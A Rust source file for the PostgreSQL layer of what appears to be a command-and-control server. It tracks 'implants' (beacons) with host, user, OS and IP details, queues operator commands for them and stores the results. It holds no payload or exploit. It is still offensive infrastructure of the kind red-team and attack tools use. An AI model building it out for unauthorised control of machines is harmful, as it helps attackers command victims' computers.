// Database module - PostgreSQL operations
//
// Schema:
// - beacons: Active implants
// - commands: Operator-issued commands
// - outputs: Command execution results

use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use sqlx::{PgPool, FromRow};
use uuid::Uuid;

#[derive(Clone)]
pub struct Database {
    pool: PgPool,
}

#[derive(Debug, Serialize, Deserialize, FromRow)]
pub struct Beacon {
    pub id: String,
    pub hostname: Option<String>,
    pub username: Option<String>,
    pub os: Option<String>,
    pub ip: Option<String>,
    pub first_seen: DateTime<Utc>,
    pub last_seen: DateTime<Utc>,
    pub status: String,
}

#[derive(Debug, Serialize, Deserialize, FromRow)]
pub struct CommandRecord {
    pub id: String,
    pub beacon_id: String,
    pub command_type: String,
    pub command_data: String,
    pub created_at: DateTime<Utc>,
    pub executed: bool,
    pub executed_at: Option<DateTime<Utc>>,
}

#[derive(Debug, Serialize, Deserialize, FromRow)]
pub struct OutputRecord {
    pub id: String,
    pub beacon_id: String,
    pub command_id: Option<String>,
    pub output_data: String,
    pub timestamp: DateTime<Utc>,
    pub status: String,
}

impl Database {
    pub fn new(pool: PgPool) -> Self {
        Self { pool }
    }

    // Beacon operations
    pub async fn register_beacon(
        &self,
        beacon_id: &str,
        hostname: Option<String>,
        username: Option<String>,
        os: Option<String>,
        ip: Option<String>,
    ) -> Result<(), sqlx::Error> {
        sqlx::query!(
            r#"
            INSERT INTO beacons (id, hostname, username, os, ip, first_seen, last_seen, status)
            VALUES ($1, $2, $3, $4, $5, NOW(), NOW(), 'active')
            ON CONFLICT (id) DO UPDATE
            SET last_seen = NOW(), status = 'active'
            "#,
            beacon_id,
            hostname,
            username,
            os,
            ip
        )
        .execute(&self.pool)
        .await?;

        Ok(())
    }

    pub async fn update_beacon_lastseen(&self, beacon_id: &str) -> Result<(), sqlx::Error> {
        sqlx::query!(
            "UPDATE beacons SET last_seen = NOW() WHERE id = $1",
            beacon_id
        )
        .execute(&self.pool)
        .await?;

        Ok(())
    }

    pub async fn list_beacons(&self) -> Result<Vec<Beacon>, sqlx::Error> {
        let beacons = sqlx::query_as!(
            Beacon,
            r#"
            SELECT id, hostname, username, os, ip, first_seen, last_seen, status
            FROM beacons
            ORDER BY last_seen DESC
            "#
        )
        .fetch_all(&self.pool)
        .await?;

        Ok(beacons)
    }

    // Command operations
    pub async fn create_command(
        &self,
        beacon_id: &str,
        command_type: &str,
        command_data: &str,
    ) -> Result<String, sqlx::Error> {
        let command_id = Uuid::new_v4().to_string();

        sqlx::query!(
            r#"
            INSERT INTO commands (id, beacon_id, command_type, command_data, created_at, executed)
            VALUES ($1, $2, $3, $4, NOW(), false)
            "#,
            command_id,
            beacon_id,
            command_type,
            command_data
        )
        .execute(&self.pool)
        .await?;

        Ok(command_id)
    }

    pub async fn get_pending_commands(&self, beacon_id: &str) -> Result<Vec<CommandRecord>, sqlx::Error> {
        let commands = sqlx::query_as!(
            CommandRecord,
            r#"
            SELECT id, beacon_id, command_type, command_data, created_at, executed, executed_at
            FROM commands
            WHERE beacon_id = $1 AND executed = false
            ORDER BY created_at ASC
            "#,
            beacon_id
        )
        .fetch_all(&self.pool)
        .await?;

        Ok(commands)
    }

    pub async fn mark_command_executed(&self, command_id: &str) -> Result<(), sqlx::Error> {
        sqlx::query!(
            "UPDATE commands SET executed = true, executed_at = NOW() WHERE id = $1",
            command_id
        )
        .execute(&self.pool)
        .await?;

        Ok(())
    }

    // Output operations
    pub async fn store_output(
        &self,
        beacon_id: &str,
        command_id: Option<String>,
        output_data: &str,
        status: &str,
    ) -> Result<String, sqlx::Error> {
        let output_id = Uuid::new_v4().to_string();

        sqlx::query!(
            r#"
            INSERT INTO outputs (id, beacon_id, command_id, output_data, timestamp, status)
            VALUES ($1, $2, $3, $4, NOW(), $5)
            "#,
            output_id,
            beacon_id,
            command_id,
            output_data,
            status
        )
        .execute(&self.pool)
        .await?;

        Ok(output_id)
    }

    pub async fn get_outputs(&self, beacon_id: &str) -> Result<Vec<OutputRecord>, sqlx::Error> {
        let outputs = sqlx::query_as!(
            OutputRecord,
            r#"
            SELECT id, beacon_id, command_id, output_data, timestamp, status
            FROM outputs
            WHERE beacon_id = $1
            ORDER BY timestamp DESC
            LIMIT 100
            "#,
            beacon_id
        )
        .fetch_all(&self.pool)
        .await?;

        Ok(outputs)
    }
}
